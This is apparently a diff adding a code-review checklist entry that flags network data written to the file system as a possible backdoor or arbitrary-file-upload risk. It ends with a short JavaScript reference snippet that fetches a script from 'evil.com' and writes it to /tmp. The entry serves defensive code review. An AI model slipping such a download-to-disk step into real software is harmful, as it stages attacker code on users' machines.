@@ -1,0 +1,25 @@
+Review focus: Network data written to file
+
+What to look for:
+- Writing network data directly to the file system allows arbitrary file upload and might indicate a backdoor.
+- Storing user-controlled data on the local file system without further validation allows arbitrary file upload, and may be an indication of malicious backdoor code that has been implanted into an otherwise trusted code base.
+- Keep the check only when the changed code appears to introduce, remove, bypass, or misuse the risky behavior itself.
+- Prefer explicit code evidence such as API calls, removed guards, changed data flow steps, changed arguments, or changed signatures over broad similarity.
+
+Relevance threshold:
+- Drop this check if the diff only changes naming, comments, formatting, or unrelated plumbing.
+- Do not keep this check solely because the file belongs to a broad category like security, configuration, or API usage.
+- This is path-sensitive. Keep it only when the diff suggests a plausible source-to-sink or input-to-operation path worth deeper inspection.
+
+Reference examples:
+- Reference example (`HttpToFileAccess.js`):
+```
+var https = require("https");
+var fs = require("fs");
+
+https.get('https://evil.com/script', res => {
+  res.on("data", d => {
+    fs.writeFileSync("/tmp/script", d)
+  })
+});
+```
